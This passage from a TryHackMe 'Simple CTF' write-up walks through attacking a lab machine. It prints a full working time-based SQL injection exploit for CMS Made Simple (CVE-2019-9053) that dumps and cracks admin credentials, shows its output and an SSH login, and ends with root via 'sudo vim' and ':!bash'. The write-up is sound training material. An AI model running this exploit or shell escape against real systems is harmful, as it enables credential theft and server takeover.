+</span></span><span style=display:flex><span>parser<span style=color:#fe8019>.</span>add_option(<span style=color:#b8bb26>&#39;-c&#39;</span>, <span style=color:#b8bb26>&#39;--crack&#39;</span>, action<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;store_true&#34;</span>, dest<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;cracking&#34;</span>, help<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;Crack password with wordlist&#34;</span>, default<span style=color:#fe8019>=</span><span style=color:#fe8019>False</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>options, args <span style=color:#fe8019>=</span> parser<span style=color:#fe8019>.</span>parse_args()
+</span></span><span style=display:flex><span><span style=color:#fe8019>if</span> <span style=color:#fe8019>not</span> options<span style=color:#fe8019>.</span>url:
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#34;[+] Specify an url target&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#34;[+] Example usage (no cracking password): exploit.py -u http://target-uri&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#34;[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#34;[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.&#34;</span>)
+</span></span><span style=display:flex><span>    exit()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>url_vuln <span style=color:#fe8019>=</span> options<span style=color:#fe8019>.</span>url <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#39;/moduleinterface.php?mact=News,m1_,default,0&#39;</span>
+</span></span><span style=display:flex><span>session <span style=color:#fe8019>=</span> requests<span style=color:#fe8019>.</span>Session()
+</span></span><span style=display:flex><span>dictionary <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$&#39;</span>
+</span></span><span style=display:flex><span>flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>password <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>temp_password <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>TIME <span style=color:#fe8019>=</span> <span style=color:#d3869b>1</span>
+</span></span><span style=display:flex><span>db_name <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>output <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>email <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>salt <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#39;&#39;</span>
+</span></span><span style=display:flex><span>wordlist <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>if</span> options<span style=color:#fe8019>.</span>wordlist:
+</span></span><span style=display:flex><span>    wordlist <span style=color:#fe8019>+=</span> options<span style=color:#fe8019>.</span>wordlist
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>crack_password</span>():
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> password
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> output
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> wordlist
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> salt
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>dict</span> <span style=color:#fe8019>=</span> <span style=color:#fabd2f>open</span>(wordlist)
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>for</span> line <span style=color:#fe8019>in</span> <span style=color:#fabd2f>dict</span><span style=color:#fe8019>.</span>readlines():
+</span></span><span style=display:flex><span>        line <span style=color:#fe8019>=</span> line<span style=color:#fe8019>.</span>replace(<span style=color:#b8bb26>&#34;</span><span style=color:#b8bb26>\n</span><span style=color:#b8bb26>&#34;</span>, <span style=color:#b8bb26>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>        beautify_print_try(line)
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>if</span> hashlib<span style=color:#fe8019>.</span>md5(<span style=color:#fabd2f>str</span>(salt) <span style=color:#fe8019>+</span> line)<span style=color:#fe8019>.</span>hexdigest() <span style=color:#fe8019>==</span> password:
+</span></span><span style=display:flex><span>            output <span style=color:#fe8019>+=</span> <span style=color:#b8bb26>&#34;</span><span style=color:#b8bb26>\n</span><span style=color:#b8bb26>[+] Password cracked: &#34;</span> <span style=color:#fe8019>+</span> line
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>break</span>
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>dict</span><span style=color:#fe8019>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>beautify_print_try</span>(value):
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> output
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#34;</span><span style=color:#b8bb26>\033</span><span style=color:#b8bb26>c&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(output)
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#39;[*] Try: &#39;</span> <span style=color:#fe8019>+</span> value)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>beautify_print</span>():
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> output
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#34;</span><span style=color:#b8bb26>\033</span><span style=color:#b8bb26>c&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(output)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>dump_salt</span>():
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> flag
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> salt
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> output
+</span></span><span style=display:flex><span>    ord_salt <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    ord_salt_temp <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>while</span> flag:
+</span></span><span style=display:flex><span>        flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>for</span> i <span style=color:#fe8019>in</span> <span style=color:#fabd2f>range</span>(<span style=color:#d3869b>0</span>, <span style=color:#fabd2f>len</span>(dictionary)):
+</span></span><span style=display:flex><span>            temp_salt <span style=color:#fe8019>=</span> salt <span style=color:#fe8019>+</span> dictionary[i]
+</span></span><span style=display:flex><span>            ord_salt_temp <span style=color:#fe8019>=</span> ord_salt <span style=color:#fe8019>+</span> <span style=color:#fabd2f>hex</span>(<span style=color:#fabd2f>ord</span>(dictionary[i]))[<span style=color:#d3869b>2</span>:]
+</span></span><span style=display:flex><span>            beautify_print_try(temp_salt)
+</span></span><span style=display:flex><span>            payload <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span style=color:#fe8019>+</span> <span style=color:#fabd2f>str</span>(TIME) <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;)+from+cms_siteprefs+where+sitepref_value+like+0x&#34;</span> <span style=color:#fe8019>+</span> ord_salt_temp <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;25+and+sitepref_name+like+0x736974656d61736b)+--+&#34;</span>
+</span></span><span style=display:flex><span>            url <span style=color:#fe8019>=</span> url_vuln <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;&amp;m1_idlist=&#34;</span> <span style=color:#fe8019>+</span> payload
+</span></span><span style=display:flex><span>            start_time <span style=color:#fe8019>=</span> time<span style=color:#fe8019>.</span>time()
+</span></span><span style=display:flex><span>            r <span style=color:#fe8019>=</span> session<span style=color:#fe8019>.</span>get(url)
+</span></span><span style=display:flex><span>            elapsed_time <span style=color:#fe8019>=</span> time<span style=color:#fe8019>.</span>time() <span style=color:#fe8019>-</span> start_time
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>if</span> elapsed_time <span style=color:#fe8019>&gt;=</span> TIME:
+</span></span><span style=display:flex><span>                flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>                <span style=color:#fe8019>break</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>if</span> flag:
+</span></span><span style=display:flex><span>            salt <span style=color:#fe8019>=</span> temp_salt
+</span></span><span style=display:flex><span>            ord_salt <span style=color:#fe8019>=</span> ord_salt_temp
+</span></span><span style=display:flex><span>    flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>    output <span style=color:#fe8019>+=</span> <span style=color:#b8bb26>&#39;</span><span style=color:#b8bb26>\n</span><span style=color:#b8bb26>[+] Salt for password found: &#39;</span> <span style=color:#fe8019>+</span> salt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>dump_password</span>():
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> flag
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> password
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> output
+</span></span><span style=display:flex><span>    ord_password <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    ord_password_temp <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>while</span> flag:
+</span></span><span style=display:flex><span>        flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>for</span> i <span style=color:#fe8019>in</span> <span style=color:#fabd2f>range</span>(<span style=color:#d3869b>0</span>, <span style=color:#fabd2f>len</span>(dictionary)):
+</span></span><span style=display:flex><span>            temp_password <span style=color:#fe8019>=</span> password <span style=color:#fe8019>+</span> dictionary[i]
+</span></span><span style=display:flex><span>            ord_password_temp <span style=color:#fe8019>=</span> ord_password <span style=color:#fe8019>+</span> <span style=color:#fabd2f>hex</span>(<span style=color:#fabd2f>ord</span>(dictionary[i]))[<span style=color:#d3869b>2</span>:]
+</span></span><span style=display:flex><span>            beautify_print_try(temp_password)
+</span></span><span style=display:flex><span>            payload <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span style=color:#fe8019>+</span> <span style=color:#fabd2f>str</span>(TIME) <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;)+from+cms_users&#34;</span>
+</span></span><span style=display:flex><span>            payload <span style=color:#fe8019>+=</span> <span style=color:#b8bb26>&#34;+where+password+like+0x&#34;</span> <span style=color:#fe8019>+</span> ord_password_temp <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;25+and+user_id+like+0x31)+--+&#34;</span>
+</span></span><span style=display:flex><span>            url <span style=color:#fe8019>=</span> url_vuln <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;&amp;m1_idlist=&#34;</span> <span style=color:#fe8019>+</span> payload
+</span></span><span style=display:flex><span>            start_time <span style=color:#fe8019>=</span> time<span style=color:#fe8019>.</span>time()
+</span></span><span style=display:flex><span>            r <span style=color:#fe8019>=</span> session<span style=color:#fe8019>.</span>get(url)
+</span></span><span style=display:flex><span>            elapsed_time <span style=color:#fe8019>=</span> time<span style=color:#fe8019>.</span>time() <span style=color:#fe8019>-</span> start_time
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>if</span> elapsed_time <span style=color:#fe8019>&gt;=</span> TIME:
+</span></span><span style=display:flex><span>                flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>                <span style=color:#fe8019>break</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>if</span> flag:
+</span></span><span style=display:flex><span>            password <span style=color:#fe8019>=</span> temp_password
+</span></span><span style=display:flex><span>            ord_password <span style=color:#fe8019>=</span> ord_password_temp
+</span></span><span style=display:flex><span>    flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>    output <span style=color:#fe8019>+=</span> <span style=color:#b8bb26>&#39;</span><span style=color:#b8bb26>\n</span><span style=color:#b8bb26>[+] Password found: &#39;</span> <span style=color:#fe8019>+</span> password
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>dump_username</span>():
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> flag
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> db_name
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> output
+</span></span><span style=display:flex><span>    ord_db_name <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    ord_db_name_temp <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>while</span> flag:
+</span></span><span style=display:flex><span>        flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>for</span> i <span style=color:#fe8019>in</span> <span style=color:#fabd2f>range</span>(<span style=color:#d3869b>0</span>, <span style=color:#fabd2f>len</span>(dictionary)):
+</span></span><span style=display:flex><span>            temp_db_name <span style=color:#fe8019>=</span> db_name <span style=color:#fe8019>+</span> dictionary[i]
+</span></span><span style=display:flex><span>            ord_db_name_temp <span style=color:#fe8019>=</span> ord_db_name <span style=color:#fe8019>+</span> <span style=color:#fabd2f>hex</span>(<span style=color:#fabd2f>ord</span>(dictionary[i]))[<span style=color:#d3869b>2</span>:]
+</span></span><span style=display:flex><span>            beautify_print_try(temp_db_name)
+</span></span><span style=display:flex><span>            payload <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span style=color:#fe8019>+</span> <span style=color:#fabd2f>str</span>(TIME) <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;)+from+cms_users+where+username+like+0x&#34;</span> <span style=color:#fe8019>+</span> ord_db_name_temp <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;25+and+user_id+like+0x31)+--+&#34;</span>
+</span></span><span style=display:flex><span>            url <span style=color:#fe8019>=</span> url_vuln <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;&amp;m1_idlist=&#34;</span> <span style=color:#fe8019>+</span> payload
+</span></span><span style=display:flex><span>            start_time <span style=color:#fe8019>=</span> time<span style=color:#fe8019>.</span>time()
+</span></span><span style=display:flex><span>            r <span style=color:#fe8019>=</span> session<span style=color:#fe8019>.</span>get(url)
+</span></span><span style=display:flex><span>            elapsed_time <span style=color:#fe8019>=</span> time<span style=color:#fe8019>.</span>time() <span style=color:#fe8019>-</span> start_time
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>if</span> elapsed_time <span style=color:#fe8019>&gt;=</span> TIME:
+</span></span><span style=display:flex><span>                flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>                <span style=color:#fe8019>break</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>if</span> flag:
+</span></span><span style=display:flex><span>            db_name <span style=color:#fe8019>=</span> temp_db_name
+</span></span><span style=display:flex><span>            ord_db_name <span style=color:#fe8019>=</span> ord_db_name_temp
+</span></span><span style=display:flex><span>    output <span style=color:#fe8019>+=</span> <span style=color:#b8bb26>&#39;</span><span style=color:#b8bb26>\n</span><span style=color:#b8bb26>[+] Username found: &#39;</span> <span style=color:#fe8019>+</span> db_name
+</span></span><span style=display:flex><span>    flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>def</span> <span style=color:#fabd2f>dump_email</span>():
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> flag
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> email
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>global</span> output
+</span></span><span style=display:flex><span>    ord_email <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    ord_email_temp <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>while</span> flag:
+</span></span><span style=display:flex><span>        flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>False</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>for</span> i <span style=color:#fe8019>in</span> <span style=color:#fabd2f>range</span>(<span style=color:#d3869b>0</span>, <span style=color:#fabd2f>len</span>(dictionary)):
+</span></span><span style=display:flex><span>            temp_email <span style=color:#fe8019>=</span> email <span style=color:#fe8019>+</span> dictionary[i]
+</span></span><span style=display:flex><span>            ord_email_temp <span style=color:#fe8019>=</span> ord_email <span style=color:#fe8019>+</span> <span style=color:#fabd2f>hex</span>(<span style=color:#fabd2f>ord</span>(dictionary[i]))[<span style=color:#d3869b>2</span>:]
+</span></span><span style=display:flex><span>            beautify_print_try(temp_email)
+</span></span><span style=display:flex><span>            payload <span style=color:#fe8019>=</span> <span style=color:#b8bb26>&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span style=color:#fe8019>+</span> <span style=color:#fabd2f>str</span>(TIME) <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;)+from+cms_users+where+email+like+0x&#34;</span> <span style=color:#fe8019>+</span> ord_email_temp <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;25+and+user_id+like+0x31)+--+&#34;</span>
+</span></span><span style=display:flex><span>            url <span style=color:#fe8019>=</span> url_vuln <span style=color:#fe8019>+</span> <span style=color:#b8bb26>&#34;&amp;m1_idlist=&#34;</span> <span style=color:#fe8019>+</span> payload
+</span></span><span style=display:flex><span>            start_time <span style=color:#fe8019>=</span> time<span style=color:#fe8019>.</span>time()
+</span></span><span style=display:flex><span>            r <span style=color:#fe8019>=</span> session<span style=color:#fe8019>.</span>get(url)
+</span></span><span style=display:flex><span>            elapsed_time <span style=color:#fe8019>=</span> time<span style=color:#fe8019>.</span>time() <span style=color:#fe8019>-</span> start_time
+</span></span><span style=display:flex><span>            <span style=color:#fe8019>if</span> elapsed_time <span style=color:#fe8019>&gt;=</span> TIME:
+</span></span><span style=display:flex><span>                flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>                <span style=color:#fe8019>break</span>
+</span></span><span style=display:flex><span>        <span style=color:#fe8019>if</span> flag:
+</span></span><span style=display:flex><span>            email <span style=color:#fe8019>=</span> temp_email
+</span></span><span style=display:flex><span>            ord_email <span style=color:#fe8019>=</span> ord_email_temp
+</span></span><span style=display:flex><span>    output <span style=color:#fe8019>+=</span> <span style=color:#b8bb26>&#39;</span><span style=color:#b8bb26>\n</span><span style=color:#b8bb26>[+] Email found: &#39;</span> <span style=color:#fe8019>+</span> email
+</span></span><span style=display:flex><span>    flag <span style=color:#fe8019>=</span> <span style=color:#fe8019>True</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>dump_salt()
+</span></span><span style=display:flex><span>dump_username()
+</span></span><span style=display:flex><span>dump_email()
+</span></span><span style=display:flex><span>dump_password()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>if</span> options<span style=color:#fe8019>.</span>cracking:
+</span></span><span style=display:flex><span>    <span style=color:#fabd2f>print</span>(<span style=color:#b8bb26>&#34;[*] Now try to crack password&#34;</span>)
+</span></span><span style=display:flex><span>    crack_password()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>beautify_print()
+</span></span></code></pre></div><p>We can crack the admin password using this exploit.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> python3.9 sql-injection.py -u http://10.10.38.40/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>+<span style=color:#fe8019>]</span> Salt <span style=color:#fe8019>for</span> password found: 1dac0d92e9fa6bb2
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>+<span style=color:#fe8019>]</span> Username found: mitch
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>+<span style=color:#fe8019>]</span> Email found: admin@admin.com
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>+<span style=color:#fe8019>]</span> Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>+<span style=color:#fe8019>]</span> Password cracked: secret
+</span></span></code></pre></div><p>Now we can use this credentials to SSH into the machine.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> ssh mitch@10.10.38.40 -p <span style=color:#d3869b>2222</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The authenticity of host <span style=color:#b8bb26>&#39;[10.10.38.40]:2222 ([10.10.38.40]:2222)&#39;</span> can<span style=color:#b8bb26>&#39;t be established.
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>This key is not known by any other names
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>Warning: Permanently added &#39;</span><span style=color:#fe8019>[</span>10.10.38.40<span style=color:#fe8019>]</span>:2222<span style=color:#b8bb26>&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style=display:flex><span><span style=color:#b8bb26>mitch@10.10.38.40&#39;</span>s password:
+</span></span><span style=display:flex><span>Welcome to Ubuntu 16.04.6 LTS <span style=color:#fe8019>(</span>GNU/Linux 4.15.0-58-generic i686<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#d3869b>0</span> packages can be updated.
+</span></span><span style=display:flex><span><span style=color:#d3869b>0</span> updates are security updates.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Mon Aug <span style=color:#d3869b>19</span> 18:13:41 <span style=color:#d3869b>2019</span> from 192.168.0.190
+</span></span><span style=display:flex><span>$ ls
+</span></span><span style=display:flex><span>user.txt
+</span></span><span style=display:flex><span>$ cat user.txt
+</span></span><span style=display:flex><span>******************
+</span></span></code></pre></div><hr><h2 id=privilege-escalation><a href=#privilege-escalation class=anchor-head aria-label=Anchor></a>Privilege Escalation</h2><h3 id=local-enumeration><a href=#local-enumeration class=anchor-head aria-label=Anchor></a>Local Enumeration</h3><p>First things first:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mitch@Machine:~$ whoami
+</span></span><span style=display:flex><span>mitch
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mitch@Machine:~$ id
+</span></span><span style=display:flex><span>uid<span style=color:#fe8019>=</span>1001<span style=color:#fe8019>(</span>mitch<span style=color:#fe8019>)</span> gid<span style=color:#fe8019>=</span>1001<span style=color:#fe8019>(</span>mitch<span style=color:#fe8019>)</span> groups<span style=color:#fe8019>=</span>1001<span style=color:#fe8019>(</span>mitch<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mitch@Machine:~$ uname -a
+</span></span><span style=display:flex><span>Linux Machine 4.15.0-58-generic <span style=color:#928374;font-style:italic>#64~16.04.1-Ubuntu SMP Wed Aug 7 14:09:34 UTC 2019 i686 i686 i686 GNU/Linux</span>
+</span></span></code></pre></div><p>Check for the list of privileged commands for user:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mitch@Machine:~$ sudo -l
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User mitch may run the following commands on Machine:
+</span></span><span style=display:flex><span>    <span style=color:#fe8019>(</span>root<span style=color:#fe8019>)</span> NOPASSWD: /usr/bin/vim
+</span></span></code></pre></div><p>Vim for the rescue.</p><h3 id=privilege-escalation-using-vim><a href=#privilege-escalation-using-vim class=anchor-head aria-label=Anchor></a>Privilege Escalation Using <code>vim</code></h3><p>Since the user does have root privilege to run <code>vim</code>, we can use <code>vim</code> to escalate the privilege.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mitch@Machine:~$ sudo vim
+</span></span></code></pre></div><p>Now inside vim enter this command:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>:!bash
+</span></span></code></pre></div><p>This will spawn us the root shell.</p><img src=/img/simple-ctf/root.webp alt=root style=zgotmplz><h3 id=conclusion><a href=#conclusion class=anchor-head aria-label=Anchor></a>Conclusion</h3><p>This was a good beginner level box. I got to know <code>CVE-2019-9053</code> for the first time.</p></div></article></main><aside id=sticky-top><div class=toc-title><p>Simple CTF | TryHackMe</p><hr id=toc-hr></div><nav id=toc class=toc-container><nav id=TableOfContents><ul><li><ul><li><a href=#overview>Overview</a></li></ul></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#port-21---ftp-vsftpd-303>Port 21 - FTP (vsFTPd 3.0.3)</a></li><li><a href=#port-80---http-apache-2418-ubuntu-default>Port 80 - HTTP (Apache 2.4.18 Ubuntu default)</a></li><li><a href=#directory-listing-dirsearch---commontxt>Directory Listing (dirsearch - common.txt)</a></li><li><a href=#simple---cms-made-simple-version-228><code>/simple/</code> - CMS Made Simple (Version 2.2.8)</a></li><li><a href=#port-2222-ssh---openssh-72p2>Port 2222 SSH - (OpenSSH 7.2p2)</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#unauthenticated-sql-injection--cve-2019-9053-cms-made-simple>Unauthenticated SQL Injection ( CVE-2019-9053 CMS Made Simple)</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#local-enumeration>Local Enumeration</a></li><li><a href=#privilege-escalation-using-vim>Privilege Escalation Using <code>vim</code></a></li><li><a href=#conclusion>Conclusion</a></li></ul></li></ul></nav></nav></aside><small class=post-updated-at>updated at 2023-01-14</small><hr><div class=series-nav><div class="alert alert-note"><div class=alert-heading-box><a href=https://h4r1337.github.io/series/try-hack-me/><p class=alert-heading>Try Hack Me Series</p></a></div></div><nav class=post-nav style=margin-top:1rem;border-top:none><a class="post-nav-item post-nav-prev" href=https://h4r1337.github.io/posts/cat-pictures/><div class=nav-arrow>Previous in series</div><span class=post-title>Cat Pictures Writeup | TryHackMe</span>
+</a><a class="post-nav-item post-nav-next" href=https://h4r1337.github.io/posts/airplane/><div class=nav-arrow>Next in series</div><span class=post-title>Airplane | TryHackMe</span></a></nav></div><nav class=post-nav><a class="post-nav-item post-nav-prev" href=https://h4r1337.github.io/posts/cat-pictures/><div class=nav-arrow>Previous</div><span class=post-title>Cat Pictures Writeup | TryHackMe</span>
+</a><a class="post-nav-item post-nav-next" href=https://h4r1337.github.io/posts/ambassador/><div class=nav-arrow>Next</div><span class=post-title>Ambassador | HackTheBox</span></a></nav></div><footer class=footer><a class=footer_item href=javascript::void(0)>resume</a>
+<a class=footer_item href=/index.xml>rss</a>
+<span class=footer_item>&copy; 2026</span>
+<small class=footer_copyright><a href=https://github.com/h4r1337/hugo-klise target=_blank rel="noreferrer noopener">hugo-klisé</a>
+theme on
+<a href=https://gohugo.io target=_blank rel="noreferrer noopener">Hugo</a><br><span>Made by <a href=https://github.com/h4r1337 target=_blank rel="noreferrer noopener">h4r1337</a></span></small></footer><script src=/js/main.js defer></script><script src=/js/toc.js defer></script></body></html>
